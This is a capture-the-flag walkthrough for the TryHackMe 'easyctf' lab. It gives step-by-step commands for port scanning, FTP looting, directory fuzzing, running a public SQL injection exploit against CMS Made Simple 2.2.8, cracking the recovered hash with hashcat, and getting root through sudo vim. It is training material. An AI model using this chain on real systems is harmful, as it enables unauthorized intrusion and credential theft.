# easyctf room

https://tryhackme.com/room/easyctf

1) nmap -A MachineIp

How many services are running under port 1000?
What is running on the higher port?

2) ftp MachineIp
- ls
- cd pub
- ls
- mget *

- grab ForMitch.txt

3) dirsearch -u MachineIp -w SecLists/Raft-large 

- Directory fuzzing -> get path /simple

4) MachineIp/simple

- CMS Made Simple
- Version 2.2.8

5) Exploit DB or Sploitus

What's the CVE you're using against the application? 
To what kind of vulnerability is the application vulnerable?

- Go see if there is a vulnerability or an cve to CMS Made Simple with the version 2.2.8
- Tip: type of vulnerability is SQL Injection
- Download exploit

6) Use exploit

- python2 46635.py -u MachineIp/simple
- get hash_passwordPart1 / username / email / hash_passwordPart2

7) hashcat

What's the password?
Where can you login with the details obtained?

- Use hashcat to decrypt the password hash
- hashcat -O -a 0 -m 20 passwordPart2:passwordPart1 /rockyou.txt
- get password

8) Connect to machine on port 2222

What's the user flag?
Is there any other user in the home directory? What's its name?
What can you leverage to spawn a privileged shell?

- ssh mitch@MachineIp -p 2222
- connected to the machine:2222
- bash
- ls 
- cat X.txt
- cd /home -> ls OR ls /home
- sudo -l (check what commands can be used by the user)

9) Use binays to bypass local security restrictions in misconfigured systems.

What's the root flag?

- https://gtfobins.github.io/
- look for vim 
- get root flag 

